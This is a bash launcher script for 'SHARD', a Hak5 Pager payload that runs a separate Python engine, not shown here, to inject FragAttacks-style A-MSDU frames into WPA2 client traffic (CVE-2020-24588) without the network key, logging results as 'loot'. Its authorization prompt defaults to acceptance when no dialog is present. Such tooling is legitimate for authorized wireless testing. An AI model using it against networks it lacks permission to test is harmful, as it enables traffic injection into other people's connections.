#!/bin/bash
# Title: SHARD - 802.11 Fragment Injection
# Author: sinXne0
# Description: Pager-only FragAttacks-style injector. Crafts an A-MSDU QoS data frame with the A-MSDU-present bit outside the encrypted body, injects it through wlan1mon, and checks whether a WPA2 client accepted it -- without knowing the PSK.
# Version: 1.0.0
# Category: user/reconnaissance
# Firmware: 2.0.0-stable or newer
# Requires: python3-light, iw (bundled libpagerctl.so)
# Optional: tcpdump, aireplay-ng (for on-air verification)
#
# AUTHORIZED TESTING ONLY. Injects frames into a client's traffic on a
# network you own or have explicit written permission to test.
#
# HARD CONSTRAINTS (verified from Hak5 docs/firmware research):
#   - 2.4 GHz and non-DFS 5 GHz only. 6 GHz / DFS channels are blocked.
#   - No WPA3 / 802.11w PMF networks. PMF defeats the injection.
#   - Target client must be vulnerable to CVE-2020-24588.
#   - Arbitrary data-frame injection is not guaranteed on every firmware;
#     SHARD probes capability and never claims unverified success.
#   - Requires AP BSSID, client MAC and channel from the Pager's recon.
#   - phy1 (wlan1mon) is used; phy0 management uplink is untouched.
#
# LED States
#   Cyan     engine starting / idle
#   Amber    probing or injecting
#   Green    canary verified on air
#   Red      error / capability check failed
#   Off      stopped
#
# Loot
#   /root/loot/shard/injections.jsonl  one record per injected frame
#   /root/loot/shard/results.jsonl     verification results
#   /root/loot/shard/shard.log         engine/UI log

# === PAYLOAD SDK STUBS ===
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]:-$0}")" 2>/dev/null && pwd)"
if ! command -v LOG          >/dev/null 2>&1; then LOG()          { echo "$*"; }; fi
if ! command -v LED          >/dev/null 2>&1; then LED()          { :; }; fi
if ! command -v ERROR_DIALOG >/dev/null 2>&1; then ERROR_DIALOG() { echo "ERROR: $*"; }; fi
if ! command -v CONFIRMATION_DIALOG >/dev/null 2>&1; then CONFIRMATION_DIALOG() { echo "${SHARD_CONFIRM:-true}"; }; fi

# === SELF-LOCATE ===
PAYLOAD_DIR=""
for candidate in "$SCRIPT_DIR" \
                 "${SHARD_PAYLOAD_DIR:-}" \
                 /root/payloads/user/*/shard \
                 /mmc/root/payloads/user/*/shard; do
    [ -n "$candidate" ] || continue
    if [ -f "$candidate/shard.py" ]; then
        PAYLOAD_DIR="$candidate"
        break
    fi
done

if [ -z "$PAYLOAD_DIR" ]; then
    LED RED 2>/dev/null
    LOG "red" "shard.py not found next to payload.sh"
    ERROR_DIALOG "SHARD files missing.\nRedeploy the payload folder."
    exit 1
fi

export LD_LIBRARY_PATH="$PAYLOAD_DIR/lib:${LD_LIBRARY_PATH}"
export PYTHONPATH="$PAYLOAD_DIR:$PAYLOAD_DIR/lib:${PYTHONPATH}"

STATE="${SHARD_STATE:-/tmp/shard_state.json}"
CMD="${SHARD_CMD:-/tmp/shard_cmd.jsonl}"
LOOT="${SHARD_LOOT:-/root/loot/shard}"
export STATE CMD LOOT

LOG_FILE="$LOOT/shard.log"
mkdir -p "$LOOT" /tmp
: > "$CMD"
rm -f "$STATE"

log(){ printf '%s %s\n' "$(date -u +%FT%TZ)" "$*" >> "$LOG_FILE" 2>/dev/null || true; }
die(){ FAIL "$*" 2>/dev/null || LOG "red" "$*"; log "FAIL $*"; LED R 255 0 0; exit 1; }
FAIL(){ LOG "red" "$*"; }
INFO(){ LOG "cyan" "$*"; }
SUCCESS(){ LOG "green" "$*"; }

PYTHON="$(command -v python3 || true)"
[ -n "$PYTHON" ] || die "python3 not installed"
"$PYTHON" -c 'import sys; sys.exit(0 if sys.version_info >= (3,6) else 1)' 2>/dev/null || die "python3 >= 3.6 required"

# Authorization gate -- must be explicitly accepted before touching the radio.
CONFIRM="$(CONFIRMATION_DIALOG "SHARD injects 802.11 frames into a client's traffic.\n\nAuthorized testing ONLY. Use only on networks you own or have written permission to test.\n\nContinue?" 2>/dev/null || true)"
case "$CONFIRM" in
  true|TRUE|yes|YES|A|a) ;;
  *) INFO "Authorization declined. Exiting."; exit 0 ;;
esac

INFO "SHARD starting (iface=${SHARD_IFACE:-wlan1mon})"
log "start dir=$PAYLOAD_DIR"

# Stop the stock UI so both processes do not fight over the framebuffer.
if command -v pineapplepager >/dev/null 2>&1; then
  /etc/init.d/pineapplepager stop >/dev/null 2>&1 || true
  killall pineapplepager >/dev/null 2>&1 || true
fi

cleanup(){
  trap - INT TERM EXIT
  INFO "stopping SHARD"
  log "stop"
  [ -n "$ENGINE_PID" ] && kill "$ENGINE_PID" >/dev/null 2>&1 || true
  [ -n "$UI_PID" ] && kill "$UI_PID" >/dev/null 2>&1 || true
  wait "$ENGINE_PID" >/dev/null 2>&1 || true
  wait "$UI_PID" >/dev/null 2>&1 || true
  rm -f "$STATE" "$CMD"
  LED ALL OFF
  exit 0
}
trap cleanup INT TERM EXIT

ENGINE_PID=""
UI_PID=""
LED C 0 180 255

"$PYTHON" "$PAYLOAD_DIR/shard.py" engine >>"$LOG_FILE" 2>&1 &
ENGINE_PID=$!
sleep 0.4
kill -0 "$ENGINE_PID" 2>/dev/null || die "engine failed; see $LOG_FILE"

"$PYTHON" "$PAYLOAD_DIR/sd/ui.py" >>"$LOG_FILE" 2>&1 &
UI_PID=$!
sleep 0.4
kill -0 "$UI_PID" 2>/dev/null || die "UI failed; see $LOG_FILE"

SUCCESS "SHARD running. Press A to authorize in the UI, then discover targets."
LED C 0 180 255

while true; do
  if ! kill -0 "$ENGINE_PID" 2>/dev/null; then
    die "engine exited unexpectedly; see $LOG_FILE"
  fi
  if ! kill -0 "$UI_PID" 2>/dev/null; then
    log "UI exited; stopping engine"
    break
  fi
  if [ -f "$STATE" ]; then
    if grep -q '"phase":"off"' "$STATE" 2>/dev/null; then
      break
    fi
    if grep -q '"phase":"inject"' "$STATE" 2>/dev/null; then
      LED 255 176 32 2>/dev/null || true
    elif grep -q '"verified":true' "$STATE" 2>/dev/null; then
      LED 0 235 130 2>/dev/null || true
    fi
  fi
  sleep 0.5
done

cleanup
